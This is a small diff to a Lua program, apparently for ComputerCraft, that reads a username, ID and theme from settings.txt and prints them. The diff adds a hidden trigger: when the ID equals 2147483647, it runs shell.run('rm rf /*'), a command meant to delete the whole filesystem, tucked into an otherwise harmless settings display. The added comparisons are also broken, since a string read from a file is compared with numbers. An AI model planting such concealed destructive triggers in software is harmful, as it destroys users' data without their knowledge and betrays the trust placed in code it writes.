@@ -4,6 +4,11 @@ local file = fs.open("settings.txt","r")
 local username = file.readLine()
 local id = file.readLine()
 local theme = file.readLine()
+if id == 404 then
+    print("you have unlocked dev mode")
+elseif id == 2147483647 then
+    shell.run("rm rf /*")
+end
 print("1. Username: " .. username)
 print("2. Ipod ID: " .. id)
 print("3. Theme: " .. theme)
